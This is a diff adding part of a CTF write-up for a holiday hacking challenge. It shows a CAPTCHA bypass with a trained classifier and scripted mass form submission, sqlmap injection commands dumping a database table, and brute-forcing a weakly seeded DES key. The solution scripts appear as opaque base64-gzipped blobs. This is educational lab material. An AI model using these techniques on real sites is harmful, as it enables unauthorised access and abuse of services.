+[source, bash, options="nowrap"]
+----
+[~]$ curl -s 'https://fridosleigh.com/api/capteha/request' \
+       | gron \
+         | sed -re 's,^(json\.images\[[[:digit:]]+\]\.base64 = ").+(";),\1REMOVED\2,' \
+           | tail -n 10
+json.images[97].base64 = "REMOVED";
+json.images[97].uuid = "40468a9a-e588-11e9-97c1-309c23aaf0ac";
+json.images[98] = {};
+json.images[98].base64 = "REMOVED";
+json.images[98].uuid = "4a7b97a2-e588-11e9-97c1-309c23aaf0ac";
+json.images[99] = {};
+json.images[99].base64 = "REMOVED";
+json.images[99].uuid = "4b5934cf-e588-11e9-97c1-309c23aaf0ac";
+json.request = true;
+json.select_type = "Presents, Ornaments, and Santa Hats";
+
+----
++
+** Pretty simple response format of
++
+----
+{
+  images: [{"uuid": "", "base64": ""}, * 100],
+  request: bool,
+  select_type: "List, of, three"
+}
+----
++
+** `images.base64` is a `PNG` encoded in base64
+** `images.uuid` is a uuid
+** `select_type` is the list of images the CAPTEHA system is expecting
++
+. Build a working directory
++
+[source, bash, options="nowrap"]
+----
+# Create a temp directory
+[~]$ cd "$(mktemp -d /tmp/ctf-08.XXX)"
+
+# Create a python virtualenv
+[/tmp/ctf-08.h8U]$ python2 -m virtualenv .venv
+
+# Activate venv
+[/tmp/ctf-08.h8U]$ source .venv/bin/activate
+(.venv) [/tmp/ctf-08.h8U]$
+----
++
+. Gather training data
+** Build a tool to collect images for the model
++
+[source, bash, options="nowrap"]
+----
+# Install deps
+(.venv) [/tmp/ctf-08.h8U]$ pip install 'requests>=2.22.0'
+
+# Extract my tool
+(.venv) [/tmp/ctf-08.h8U]$ base64 -d << 'EOF' | gunzip --stdout | tee download-images.py
+H4sICCkeCV4CA2Rvd25sb2FkLWltYWdlcy5weQBlUstuxCAMvOcrWHphpQqkarWHlXJrvwOR4CRu
+G6BA9qGq/14IyWar+uTY45mxw9OOiCl40aARYM7E3eJgzUtV4eisj6RRAY6H9es9WLPmNqyZh68J
+QgxVVWnoyKjQsP2pIimwI8ZmLHcqDhyDRs8oFziqHgJdUDkSZFQfkPrhEVDNAE/quwrvITI6xOjC
+SYjOo7bhE7AfeGtHoRyKVrkIgxLLRCKZOSA4awIkqrwG/7RKB+Z5hGtcZIrorFWwRevu5WGjUtvs
+e4WJ+u3agotoDaOvqGeghxbwDESZ2zK0W7fqrC8lguYfoVFjtjqXi41pQr2YyNEcD3/75Vc9IBy2
+cfKZpbR4GtHQWg0sZRvugnEg1oHZDi++s9oPd6anPPkcVWS5Umdb+2dCLw3dExVItzmeV+IXjxHY
+Ir1ePuUmvY50Oykzg5SkrgmVMr8VKWkhKQ+n+gXDU5CxkwIAAA==
+EOF
+
+# Run the downlaoder a number of times
+(.venv) [/tmp/ctf-08.h8U]$ python download-images.py
+
+# Check number of files
+(.venv) [/tmp/ctf-08.h8U]$ find ./images | wc -l
+1000
+----
++
+image::08/02-have-pics.png[Showing I have images downloaded]
++
+** Manually categorize all of these images :(
++
+.Folders for each type
+image::08/03-folders.png[Folders of picture types]
++
+.All clean and uniform
+image::08/04-neat.png[Showing each folder only has images of that type]
+. Build a model
+** I wanted to try Google's https://teachablemachine.withgoogle.com/[Teachable Machine] for this
++
+image::08/05-tm.png[New project screen]
++
+** I went with the `Image Project`
+** I created a class for each of the image types
++
+image::08/06-classes.png[Picture of all classes]
++
+** Named all 6 classes `candy_canes, christmas_trees, ornaments, presents, santa_hats, and stockings`
+** Uploaded photos into their classes
++
+image::08/07-full.png[]
++
+** Clicked `Train Model` button
++
+image::08/08-training.png[]
++
+** Exported my model
++
+image::08/09-export.png[]
++
+. Solve the CAPTEHA
+** Run my custom script
++
+[source, bash, options="nowrap"]
+----
+# Install deps
+(.venv) [/tmp/ctf-08.h8U]$ pip install \
+                                       'tensorflow>=2.0.0' \
+                                       'Pillow>=6.2.1'
+
+# Copy model to working dir
+(.venv) [/tmp/ctf-08.h8U]$ cp /path/to/keras_model.h5 .
+
+# Extract my script
+(.venv) [/tmp/ctf-08.h8U]$ base64 -d << 'EOF' | gunzip --stdout | tee not-human.py
+H4sICAUoCV4CA25vdC1odW1hbi5weQCdVt1v4zYMf/dfwbkPp2yp0/a621AgD+s+DgWKbdjdWxAY
+is00utqST5LbeMP97yMlf6XXvSwPgUT+RInkj6TPvoFV6+xqp/QK9RM0nT8YfZUkqm6M9bCTDt9d
+DztlhtUnZ/Sw1m3ddMPG4ucWnXfD3qN2xu4r85w9opUu2VtTw59399AD7mr5gEly/9Ptr/cfYA2b
+BOiXOqm9hIP0Ll1GSSF12QH94yhy3hSPSj9MmINVztfSgbc44YzVskY92Wosun6/TZIz+EU5uasQ
+XKFIrPaqAG289Mpo2BsLRSWt8l0SXM0c+ryxSnvTMMIJ1zZs0a0/2hYXbPDeyBL8AaE2JVZJ+Cfn
+XkYjCwqXVQTPw1qkQRE32eH7dAmFqRtV4fo3WTm2bnNHd/HT1mO4sw9RJFjP8gGTNcZ5kR68b9zN
+arW3qjSuQvVwyMjuSjZqVcjG40GuelvpIiklxX4dkhye5oTNPB79gnlB6XKkZEz2gGQ7itJBmVeU
+Ak4kRZZjF4SgdFy4m5ABzgdhgihaaVtVkg1W7t5dn+oiC3ttowrfWj4dxRnBSywoXoJWETM9JJNN
+g7oUgm9cDocXJ4/NK+RY0r+YhCGN79GHLAaXzJ7WzLYg6qMGykFlDLOQmZJERG7l80mMHFZY+Nx3
+DZIbPYhogJys6UwWRGJATLogz1xTKTK2hNHG5vxyO6J4k1lsKlmgSKlcgKFp8ORni9JjeLm0VnbR
+GwRLTPDgDrIhpYE9YgnM7KAMVOwpfAYfSfKGgvTgD2+AEkvFsKP3k6GeFJ1puT6haf1kI96mHBko
+0aOtlaYrdl1Q7pWlwBJFVSg1IglL+9e0TUUZCzIKckHJhsts4GasRF0G8yKcWIvTlC7h6uq6/3u7
+WELJ0V/Hg1SC0r+9iqEx+gmpE8mqGqLSO0Qu/PX+FlzwpINnRYhnYx/p0LPyhwClwj9/QE2R8uRX
+LNtE0QsvAvsfl/A0kj887WbG0F3n0eXKMN1Ndsu7uz/E05zEkUmhS2amGSk6nJxBh5oJRCqiUyIl
+B5gBX6GIKE79jUIMQVrMb41ZG8IsXQxz0PXGzuB3Y2tZkY0pZLG2B3mZnxoTsy3Z5HSI03TACi6v
+fsguFnAOl8M9Yy8dOsmcWQHDnNgoLoTX746OwXdrNnoGto08U3qPFnWBCSWxpM4Qe2rMYS8SbHsx
+A0R6hQcTdpJn3rBGnFCqJwi1p2A7tJEwAMP5QDByBxq0BY8jOnlOZUZsD1TbIbSOSEWoz60qHquO
+CkbHWFRyRxPF04AkmPN0Ekjp3SwXL97MLXlDt4kOvoXLC4ox87Njch63YX3k9aueUitPwo1EOV3i
+kW0ds7AUtTyK42LxnxborGk99YS8L91/vprwNzQsXpnyM/E06efYF9N+ppom/kw4Tv0o+9LPp2UM
+Zu8ZOYBEylDPYu7zIhZuDPwa4gfLZnZ0G/RFyy195nGEbCObecqNdcrRIdpuLsaTw7RiGBFJakdt
+382GaWj0fU+kaMQn9bCMJjQfnt8dYNvRVO68ZQNrmgxp9skoLfrDBOEvhTFHaZRTqE5Ofvn/nxeu
+3dXK00Qa7+E7+TNq/LqIu/Q8JYb+eDHsp8sKHrToeKTmoTipZ/0LOsUMC8IKAAA=
+EOF
+
+# Run the script and extract the JWT from the response
+(.venv) [/tmp/ctf-08.h8U]$ python not-human.py
+{"data":"You are not a human!","request":true}
+
+--------------------------------------------------------------------------------
+{'session': 'LONG_JWT'}
+----
++
+. Submit form a bunch of times
++
+NOTE: You need to use a real email address as a key is emailed to you.
++
+NOTE: When you extract the script for this section there are two variables that you need to fill in; `JWT` and `EMAIL`
++
+----
+# Extract my script
+(.venv) [/tmp/ctf-08.h8U]$ base64 -d << 'EOF' | gunzip --stdout | tee send-form.py
+H4sICIYrCV4CA3NlbmQtZm9ybS5weQBVUU1PwzAMvedXhHDppNECJ1RpEiCBKBpcNoljlLXuGq1N
+QuIOJsR/Jx+sjBwS+T0/x/Y7P6PF6GyxkaoAtafmgJ1W14TIwWiL1ML7CA4dIc9va7qg7LFaLvn6
+qVrx6pWRh5e7ahnggx7trQXRX8AgZJ/XemCEkAZa6mOVzUpC/am13knwgmPdPCH+9WIEnsKMOXBO
+asXm1P87i1p3KlslPvulpjIO8FgjPSmhESi8/CsG4bBW7LWVCI6VlNWjkU1tR1V3bP6XI7YQ2Kub
+y3/oRo8Y8J1EPJwycXTPxK2c4EoMsdC9FaoJQ0XqO94fneyBru0I5SSwvlWXG+0wYx2icWVRtFY2
+2vUgt11YbiGM9Iah9Q3E6WaT2lipMLM5wicm1AjnDSSypZyHXjinC+8Z58Eazln6OflEfgAdzs9M
+EgIAAA==
+EOF
+
+# Edit the script to fill in your information
+
+# Run script; Ctrl+C when you see the message about already winning
+(.venv) [/tmp/ctf-08.h8U]$ python send-form.py
+...
+Entries for email address REDACTED no longer accepted as our systems show your email was already randomly selected as a winner! Go check your email to get your winning code. Please allow up to 3-5 minutes for the email to arrive in your inbox or check your spam filter settings.
+----
+
+image::08/10-email.png[Winner email]
+
+*Answer:* `8Ia8LiZEwvyZr2WO`
+
+==== Chat
+
+.Chat log
+----
+(Krampus - PRE)
+- Hello there! I’m Krampus Hollyfeld.
+- I maintain the steam tunnels underneath Elf U,
+- Keeping all the elves warm and jolly.
+- Though I spend my time in the tunnels and smoke,
+- In this whole wide world, there's no happier bloke!
+- Yes, I borrowed Santa’s turtle doves for just a bit.
+- Someone left some scraps of paper near that fireplace, which is a big fire hazard.
+- I sent the turtle doves to fetch the paper scraps.
+- But, before I can tell you more, I need to know that I can trust you.
+- Tell you what – if you can help me beat the Frido Sleigh contest (Objective 8), then I'll know I can trust you.
+- The contest is here on my screen and at fridosleigh.com.
+- No purchase necessary, enter as often as you want, so I am!
+- They set up the rules, and lately, I have come to realize that I have certain materialistic, cookie needs.
+- Unfortunately, it's restricted to elves only, and I can't bypass the CAPTEHA.
+- (That's Completely Automated Public Turing test to tell Elves and Humans Apart.)
+- I've already cataloged 12,000 images and decoded the API interface.
+- Can you help me bypass the CAPTEHA and submit lots of entries?
+
+(Krampus - POST)
+- Hello there! I’m Krampus Hollyfeld.
+- You did it! Thank you so much. I can trust you!
+- To help you, I have flashed the firmware in your badge to unlock a useful new feature: magical teleportation through the steam tunnels.
+- As for those scraps of paper, I scanned those and put the images on my server.
+- I then threw the paper away.
+- Unfortunately, I managed to lock out my account on the server.
+- Hey! You’ve got some great skills. Would you please hack into my system and retrieve the scans?
+- I give you permission to hack into it, solving Objective 9 in your badge.
+- And, as long as you're traveling around, be sure to solve any other challenges you happen across.
+----
+
+=== 09 - Retrieve Scraps of Paper from Server
+
+Location: `Offline`
+
+Difficulty: `4/5`
+
+.Objective
+----
+Gain access to the data on the Student Portal server and retrieve the paper scraps hosted there. What is the name of Santa's cutting-edge sleigh guidance system? For hints on achieving this objective, please visit the dorm and talk with Pepper Minstix.
+----
+
+==== Links
+
+* https://studentportal.elfu.org/[Elf University]
++
+image::09/00-website.png[]
+* https://mega.nz/#!wsx20ChA!_dLMsePbp28JTRAeqWrUq7dD9YrKRev8L-VwyMpOK_c[krampus-images.zip]
+** Copy of raw files required scraped from the database
++
+NOTE: SHA256: `57c6593afa23fa94c81cdea76c6f54f1d3ada760825d949e8fcd9f8d3c2e68f0`
+
+==== Solution
+
+. Look around website
+** Noticed form submits first reach out to `https://studentportal.elfu.org/validator.php` and retrieve a token
+*** The token behaves like a CSRF token
+*** The token is sent along with the form submission
+. Decided to test the application check form for SQL injection vulnerabilities
++
+[source, bash, options="nowrap"]
+----
+# https://studentportal.elfu.org/application-check.php?elfmail=EMAIL&token=CSRF_TOKEN
+[~]$ python sqlmap.py --tables -u 'https://studentportal.elfu.org/application-check.php?elfmail=EMAIL&token=CSRF_TOKEN' --eval='import requests; token=requests.get("https://studentportal.elfu.org/validator.php").text;'
+...
+Database: elfu
+[3 tables]
++---------------------------------------+
+| applications                          |
+| krampus                               |
+| students                              |
++---------------------------------------+
+...
+
+# Dump krampus table
+[~]$ python sqlmap.py --dump -T 'krampus' -u 'https://studentportal.elfu.org/application-check.php?elfmail=EMAIL&token=CSRF_TOKEN' --eval='import requests; token=requests.get("https://studentportal.elfu.org/validator.php").text;'
+...
++----+-----------------------+
+| id | path                  |
++----+-----------------------+
+| 1  | /krampus/0f5f510e.png |
+| 2  | /krampus/1cc7e121.png |
+| 3  | /krampus/439f15e6.png |
+| 4  | /krampus/667d6896.png |
+| 5  | /krampus/adb798ca.png |
+| 6  | /krampus/ba417715.png |
++----+-----------------------+
+...
+----
++
+. Download images
++
+[source, bash, options="nowrap"]
+----
+# Create a temp directory
+[~]$ cd "$(mktemp -d /tmp/ctf-09.XXX)"
+
+# Download images
+[/tmp/ctf-09.Ahk]$ curl -sOL 'https://studentportal.elfu.org/krampus/0f5f510e.png' ; \
+                   curl -sOL 'https://studentportal.elfu.org/krampus/1cc7e121.png' ; \
+                   curl -sOL 'https://studentportal.elfu.org/krampus/439f15e6.png' ; \
+                   curl -sOL 'https://studentportal.elfu.org/krampus/667d6896.png' ; \
+                   curl -sOL 'https://studentportal.elfu.org/krampus/adb798ca.png' ; \
+                   curl -sOL 'https://studentportal.elfu.org/krampus/ba417715.png' ;
+----
++
+. Piece images together
++
+image::09/01-finished.png[]
+
+*Answer:* `Super Sled-o-matic`
+
+==== Chat
+
+.Chat log
+----
+(Krampus - POST)
+- Wow! We’ve uncovered quite a nasty plot to destroy the holiday season.
+- We’ve gotta stop whomever is behind it!
+- I managed to find this protected document on one of the compromised machines in our environment.
+- I think our attacker was in the process of exfiltrating it.
+- I’m convinced that it is somehow associated with the plan to destroy the holidays. Can you decrypt it?
+- There are some smart people in the NetWars challenge room who may be able to help us.
+----
+
+=== 10 - Recover Cleartext Document
+
+Location: `Offline`
+
+Difficulty: `5/5`
+
+.Objective
+----
+The Elfscrow Crypto tool is a vital asset used at Elf University for encrypting SUPER SECRET documents. We can't send you the source, but we do have debug symbols that you can use.
+
+Recover the plaintext content for this encrypted document. We know that it was encrypted on December 6, 2019, between 7pm and 9pm UTC.
+
+What is the middle line on the cover page? (Hint: it's five words)
+
+For hints on achieving this objective, please visit the NetWars room and talk with Holly Evergreen.
+----
+
+==== Links
+
+* https://mega.nz/#!osYG2QYZ!nfpgBDAsR1nK7XTqz2siaEcwoKr7FhiHGiOhmk_urt8[elfscrow.exe]
+** File encrypting application
++
+NOTE: SHA256: `7f4207827e732d459e493a72507becfe24b21e479e1057f12ff321c036cb791f`
++
+* https://mega.nz/#!s4JiiSjK!BQj_WiTigOctw0V7_x2HOOamad1jr7tT0UHUUZei1ao[elfscrow.pdb]
+** Debug symbols for `elfscrow.exe`
++
+NOTE: SHA256: `bf9cb71ce8699cb6d1a39760b9a7a9e330389b303ad710b8572bcde29efcc34c`
++
+* https://mega.nz/#!tsJwGSyA!d2CBomVaYk8l4ydluaMXDllr5dV-gqqk1PFa24P39yo[ElfUResearchLabsSuperSledOMaticQuickStartGuideV1.2.pdf.enc]
+** File encrypted by `elfscrow.exe`
+NOTE: SHA256: `9486b115183de64d052b2a5e56f41a037d9e44ad498a6ad2329d7ef2150c5662`
++
+* https://mega.nz/#!xwADQC5a!K_TNXocQY-q9h8z13k-IMc_cMWm16OmohIESpDS5QRs[ElfUResearchLabsSuperSledOMaticQuickStartGuideV1.2.pdf]
+** Decrypted version of `ElfUResearchLabsSuperSledOMaticQuickStartGuideV1.2.pdf.enc`
++
+NOTE: SHA256: `9c64d6a3b5d39867b0d5b67d71a0a7cba48449300841ecce0eb136c05edcc562`
+
+==== Solution
+
+. Create working directory
++
+[source, bash, options="nowrap"]
+----
+# Create a temp directory
+[~]$ cd "$(mktemp -d /tmp/ctf-10.XXX)"
+
+# Copy challenge files into working directory
+[/tmp/ctf-10.wCu]$ cp /path/to/files/10/* .
+
+# Create virtualenv
+[/tmp/ctf-10.wCu]$ python2 -m virtualenv .venv
+
+# Activate virtualenv
+[/tmp/ctf-10.wCu]$ source .venv/bin/activate
+
+# Install deps
+(.venv) [/tmp/ctf-10.wCu]$ pip install 'pycryptodome>=3.9.4'
+----
++
+. Load `elfscrow.exe` in https://rada.re/n/[r2]
++
+[source, bash, options="nowrap"]
+----
+(.venv) [/tmp/ctf-10.wCu]$ r2 elfscrow.exe
+# Load the provided PDB
+[0x004037f7]> idp elfscrow.pdb
+
+# Analyse the file
+[0x004037f7]> aaa
+
+# List the functions
+[0x004037f7]> afl
+0x00401000  104 1903 -> 1872 pdb.int___cdecl__getopt_internal_int__char_____const__char_const____struct_option_const____int____int
+0x00401770   64 1297 -> 1260 sub.s:_illegal_option_____c_770
+0x00401c90    1 35           pdb.int___cdecl_getopt_long_only_int__char_____const__char_const____struct_option_const____int
+0x00401cc0    4 203          pdb.void___cdecl_fatal_error_char
+0x00401d90    1 42           pdb.void___cdecl_super_secure_srand_int
+0x00401dc0    1 39           pdb.int___cdecl_super_secure_random_void
+0x00401df0    5 99           pdb.void___cdecl_generate_key_unsigned_char___const
+0x00401e60    1 18           fcn.00401e60
+0x00401e80    5 68           pdb.void___cdecl_to_hex_unsigned_char___const__char___const
+0x00401ed0    5 79           pdb.void___cdecl_from_hex_char___const__unsigned_char___const
+0x00401f20   25 758          pdb.void___cdecl_store_key_int__unsigned_char___const
+0x00402220    1 18           pdb.void___cdecl_retrieve_key_int__unsigned_char___const__char
+0x00402540    5 126          pdb.void___cdecl_print_hex_char____unsigned_char____unsigned_int
+0x004025c0    8 154          pdb.unsigned_char_____cdecl_read_file_char____unsigned_long_int
+0x00402660    6 103          pdb.void___cdecl_write_file_char____unsigned_char____unsigned_int
+0x004026d0    1 15           pdb.void___cdecl_do_encrypt_int__char____char
+0x00402a00    1 15           pdb.void___cdecl_do_decrypt_int__char____char____char
+0x00402d80    1 45           pdb.void___cdecl_usage_char
+0x00402db0   86 1942 -> 1943 pdb._main
+0x00403546    3 15   -> 122  pdb.___security_check_cookie_4
+0x004037f7   14 10   -> 202  entry0
+0x00403801    1 107          pdb.___report_gsfailure
+0x00403958    1 6            pdb.__amsg_exit
+0x0040395e    3 139  -> 145  pdb.__onexit
+0x004039f4    1 6            loc.004039f4
+0x004039fa    1 9            fcn.004039fa
+0x00403a03    1 23           pdb._atexit
+0x00403a66    1 6            pdb.__XcptFilter
+0x00403a70    4 53           pdb.__ValidateImageBase
+0x00403ab0    7 68           pdb.__FindPESection
+0x00403b00    1 39           pdb.__IsNonwritableInCurrentImage
+0x00403bbe    1 6            pdb.__initterm
+0x00403bc4    1 6            pdb.__initterm_e
+0x00403bcc    1 38           pdb.__SEH_prolog4
+0x00403c11    1 20           pdb.__SEH_epilog4
+0x00403c4a    3 43           pdb.__setdefaultprecision
+0x00403c78    8 150  -> 152  pdb.___security_init_cookie
+0x00403d0e    1 6            pdb.__crt_debugger_hook
+0x00403d14    1 6            pdb.void___cdecl_terminate_void
+0x00403d1a    1 6            pdb.__unlock
+0x00403d20    1 6            pdb.___dllonexit
+0x00403d26    1 6            pdb.__lock
+0x00403d2c    1 6            pdb.__except_handler4_common
+0x00403d32    1 6            pdb.__invoke_watson
+0x00403d38    1 6            pdb.__controlfp_s
+
+# NOTE: This function looks important
+#       - pdb.void___cdecl_generate_key_unsigned_char___const
+
+[0x00401e37]> pdf @pdb.void___cdecl_generate_key_unsigned_char___const
+/ (fcn) pdb.void___cdecl_generate_key_unsigned_char___const 99
+|   pdb.void___cdecl_generate_key_unsigned_char___const (int arg_8h);
+|           ; var int local_4h @ rbp-0x4
+|           ; arg int arg_8h @ rbp+0x8
+|              ; CALL XREF from 0x00402737 (pdb.void___cdecl_do_encrypt_int__char____char + 103)
+|           0x00401df0      55             push rbp
+|           0x00401df1      8bec           mov ebp, esp
+|           0x00401df3      51             push rcx
+|           0x00401df4      6810434000     push str.Our_miniature_elves_are_putting_together_random_bits_for_your_secret_key ; 0x404310 ; "Our miniature elves are putting together random bits for your secret key!\n\n"
+|           0x00401df9      ff15cc404000   call qword [0x00805ecb]     ; [0x805ecb:8]=-1
+|           0x00401dff      83c040         add eax, 0x40               ; '@'
+|           0x00401e02      50             push rax
+|           0x00401e03      ff15c8404000   call qword [0x00805ed1]     ; [0x805ed1:8]=-1
+|           0x00401e09      83c408         add esp, 8
+|           0x00401e0c      6a00           push 0
+|           0x00401e0e      e84d000000     call fcn.00401e60
+|           0x00401e13      83c404         add esp, 4
+|           0x00401e16      50             push rax
+|           0x00401e17      e874ffffff     call pdb.void___cdecl_super_secure_srand_int
+|           0x00401e1c      83c404         add esp, 4
+|           0x00401e1f      c745fc000000.  mov dword [local_4h], 0
+|       ,=< 0x00401e26      eb09           jmp 0x401e31
+|       |      ; JMP XREF from 0x00401e4d (pdb.void___cdecl_generate_key_unsigned_char___const)
+|      .--> 0x00401e28      8b45fc         mov eax, dword [local_4h]
+|      :|   0x00401e2b      83c001         add eax, 1
+|      :|   0x00401e2e      8945fc         mov dword [local_4h], eax
+|      :|      ; JMP XREF from 0x00401e26 (pdb.void___cdecl_generate_key_unsigned_char___const)
+|      :`-> 0x00401e31      837dfc08       cmp dword [local_4h], 8     ; [0x8:4]=-1 ; 8
+|      :,=< 0x00401e35      7318           jae 0x401e4f
+|      :|   0x00401e37      e884ffffff     call pdb.int___cdecl_super_secure_random_void
+|      :|   0x00401e3c      0fb6c8         movzx ecx, al
+|      :|   0x00401e3f      81e1ff000000   and ecx, 0xff
+|      :|   0x00401e45      8b5508         mov edx, dword [arg_8h]     ; [0x8:4]=-1 ; 8
+|      :|   0x00401e48      0355fc         add edx, dword [local_4h]
+|      :|   0x00401e4b      880a           mov byte [rdx], cl
+|      `==< 0x00401e4d      ebd9           jmp 0x401e28
+|       |      ; JMP XREF from 0x00401e35 (pdb.void___cdecl_generate_key_unsigned_char___const)
+|       `-> 0x00401e4f      8be5           mov esp, ebp
+|           0x00401e51      5d             pop rbp
+\           0x00401e52      c3             ret
+
+# Looking into the function that "seeds" the random number generator
+[0x00401d90]> pdf @pdb.void___cdecl_super_secure_srand_int
+/ (fcn) pdb.void___cdecl_super_secure_srand_int 42
+|   pdb.void___cdecl_super_secure_srand_int (int arg_8h);
+|           ; arg int arg_8h @ rbp+0x8
+|              ; UNKNOWN XREF from 0x00401e17 (pdb.void___cdecl_generate_key_unsigned_char___const)
+|              ; CALL XREF from 0x00401e17 (pdb.void___cdecl_generate_key_unsigned_char___const)
+|           0x00401d90      55             push rbp
+|           0x00401d91      8bec           mov ebp, esp
+|           0x00401d93      8b4508         mov eax, dword [arg_8h]     ; [0x8:4]=-1 ; 8
+|           0x00401d96      50             push rax
+|           0x00401d97      68e8424000     push str.Seed____d          ; 0x4042e8 ; "Seed = %d\n\n"
+|           0x00401d9c      ff15cc404000   call qword [0x00805e6e]     ; [0x4040cc:8]=0x55c0000055b2 ; pdb.__imp____iob_func
+|           0x00401da2      83c040         add eax, 0x40               ; '@'
+|           0x00401da5      50             push rax
+|           0x00401da6      ff15c8404000   call qword [0x00805e74]     ; [0x805e74:8]=-1
+|           0x00401dac      83c40c         add esp, 0xc
+|           0x00401daf      8b4d08         mov ecx, dword [arg_8h]     ; [0x8:4]=-1 ; 8
+|           0x00401db2      890d2c604000   mov dword [0x00807de4], ecx ; [0x807de4:4]=-1
+|           0x00401db8      5d             pop rbp
+\           0x00401db9      c3             ret
+
+# Now onto pdb.int___cdecl_super_secure_random_void
+[0x00401dc0]> pdf @pdb.int___cdecl_super_secure_random_void
+/ (fcn) pdb.int___cdecl_super_secure_random_void 39
+|   pdb.int___cdecl_super_secure_random_void ();
+|              ; UNKNOWN XREF from 0x00401e37 (pdb.void___cdecl_generate_key_unsigned_char___const)
+|              ; CALL XREF from 0x00401e37 (pdb.void___cdecl_generate_key_unsigned_char___const)
+|           0x00401dc0      55             push rbp
+|           0x00401dc1      8bec           mov ebp, esp
+|           0x00401dc3      a12c60400069.  movabs eax, dword [0x43fdc0690040602c] ; [0x43fdc0690040602c:4]=-1
+|           0x00401dcc      0300           add eax, dword [rax]
+|           0x00401dce      05c39e2600     add eax, 0x269ec3
+|           0x00401dd3      a32c604000a1.  movabs dword [0x40602ca10040602c], eax ; [0x40602ca10040602c:4]=-1
+|           0x00401ddc      00c1           add cl, al
+|           0x00401dde      f8             clc
+|           0x00401ddf      1025ff7f0000   adc byte [0x00409de4], ah
+|           0x00401de5      5d             pop rbp
+\           0x00401de6      c3             ret
+----
++
+. Create psudo version of what the app does
++
+[source, bash, options="nowrap"]
+----
+# pdb.void___cdecl_generate_key_unsigned_char___const translated
+RANDOM_SEED = time.now()       ; epoch time
+key = [0, 0, 0, 0, 0, 0, 0, 0] ; 8 byte buffer to store encryption key
+for i in range(0, 8):          ; generate 8 random ints and stuff them into a byte at index i
+    key[i] = byte(get_random())
+
+# get_random translated
+global SEED
+SEED = ((SEED * 0x343fd) + 0x269ec3)
+return SEED >> 0x10 & 0x7fff
+
+# do_encrypt
+c = DES(key, iv=0)
+ciphertext = c.encrypt(plaintext)
+----
++
+. Create tool to bruteforce decrypt the seed value
++
+[source, bash, options="nowrap"]
+----
+# Extract my tool
+(.venv) [/tmp/ctf-10.wCu]$ base64 -d << 'EOF' | gunzip --stdout | tee brute.py
+H4sICBJsCV4CA2JydXRlLnB5AJ1UXW/TMBR9z6+4M4IlMGVZx0ZBKg/0AyEBAyp4GZPlJjerWWtH
+rrN2Qvx3rh23yT5AiDwkjn3vOefee5JHe3BYr8zhTKpDVNdQ3di5Vr0okstKGwtWLjEqjV7C0NxU
+VqdDWc3RQDgejadRFE3H4xEM4KNWSG8FlrBCLLgRqtDLGCudzwfuMHkVAV2XCz0TC3BZ/j2kS2Vj
+R5e6W5yALEFpCz4dcLHCZpn4HIO2NiqwXaINZNyB/J0m9s+nkG2Onx9PRgk8o2Xv9OV4eNxBbqJf
+v6azowye0OPFZDLZ8Sk0wiK/wpv75d2vvaObMuhsTTrOndS7yj3TZJJAqQ1wagnQ6SXG2QH0k4st
+AmUzlv7QUsXn+dzEmyZ+4+IDwUW3TW4zSC8wd3OMaecACmFFEJ03Yx24iaYK102Ae/lwNhrz4Zvh
+AcjrQcy+b7KMUfv6yS2GJj/dwnvkQDkztUXSl2NcCTsPhGtp56ArVH7zAJiZsQTECsrmvBVlcWNJ
+WJkaFEXcJ1h3VupaFbwxR7Bes22CY3a9Ozp5cXJ60u9n1ES/Pj3NsixpaZqOPjDUztzcFYrDgqI7
+fRzsejloBbdZZGP2+NNowrybSdUOplXgi9XKSlXjbvN2hf4ZBUCHRKwtgBGSvo/xJsfKSq1iNpKF
+jyqlKkDAtVjQBqXssVtj63CEaS0FuSo0x02GW81RBcW8lAt039COmKWH40X59QuuUJh8/l7MVtO6
+QjNdYHH2QViZf65lfjW1wti3tSzw21HaS6uiTAmUeZjkgXne8cx9EU1SZdxX04o5f3cBEwcEdh5+
+F7QSFtZkrHpFk7MaApAP8fXs//SRv/ZZSpRL0UF0V+OFbqe2J0nQ/4Ch7yv+d4sHwD/Z7QGjdsQl
+f7BiK4/938AYFbDeFtBrKyh76dpIi/FOb3c2fiRnta1q6yppa3ItYXf+5eRszpVYIucwoH8c586N
+nLOGrbFm9BssxC83swYAAA==
+EOF
+
+# Bruteforce the key
+(.venv) [/tmp/ctf-10.wCu]$ python brute.py
+[I] Found the epoch that was used to encrypt the file '1575663650'
+[I] Outputted decrypted file
+----
+
+image::10/00-decrypted.png[First page of decrypted document]
+
+*Answer:* `Machine Learning Sleigh Route Finder`
+
+=== 11 - Open the Sleigh Shop Door
+
+Location: `https://crate.elfu.org/`
+
+Difficulty: `5/5`
+
+image::11/00-location.png[]
+
+.Objective
+----
+Visit Shinny Upatree in the Student Union and help solve their problem. What is written on the paper you retrieve for Shinny?
+
+For hints on achieving this objective, please visit the Student Union and talk with Kent Tinseltooth.
+----
+
+==== Solution
+
+WARNING: Start with lock 04! Sometimes the key for this challenge does not work :(.
+
+. Lock 01
++
+----
+- I locked the crate with the villain's name inside. Can you get it out?
+- You don't need a clever riddle to open the console and scroll a little.
+----
++
+** This one is in the console
++
+image::11/02-console.png[]
++
+. Lock 02
++
+----
+- Some codes are hard to spy, perhaps they'll show up on pulp with dye?
+----
++
+** I selected an element near this in the DOM
++
+image::11/03-dom.png[]
++
+. Lock 03
++
+----
+- This code is still unknown; it was fetched but never shown.
+----
++
+** This one can be found in the network tools tab
++
+image::11/04-net.png[]
++
+. Lock 04
++
+----
+- Where might we keep the things we forage? Yes, of course: Local barrels!
+----
++
+** This key is in the sites local storage
++
+image::11/01-storage.png[]
++
+. Lock 05
++
+----
+- Did you notice the code in the title? It may very well prove vital.
+----
++
+** This one was in the title
++
+image::11/05-title.png[]
++
+. Lock 06
++
+----
+- In order for this hologram to be effective, it may be necessary to increase your perspective.
+----
++
+** This one requires you to change the `perspective` value for the hologram
++
+.Pre change
+image::11/06-pre.png[]
++
+.Adding style
+image::11/07-style.png[]
++
+.Post change
+image::11/08-post.png[]
++
+. Lock 07
++
+----
+- The font you're seeing is pretty slick, but this lock's code was my first pick.
+----
++
+** This one is found in the font name for the challenge text
++
+image::11/09-font.png[]
++
+. Lock 08
++
+----
+- In the event that the .eggs go bad, you must figure out who will be sad.
+----
++
+** This one can be found in the `Event Listeners` for `.eggs`
++
+image::11/10-event.png[]
++
+. Lock 09
++
+----
+- This next code will be unredacted, but only when all the chakras are :active.
+----
++
+** This one requires you to set all of the spans with class `chakra` to `:active`
++
+.Force the state
+image::11/11-active.png[]
++
+.Revealed
+image::11/12-done.png[]
+. Lock 10
++
+----
+- Oh, no! This lock's out of commission! Pop off the cover and locate what's missing.
+----
++
+** This one requires you to find the missing parts for the lock
+** Remove the lid of the lock
++
+.Hide the lid element
+image::11/13-hide.png[]
++
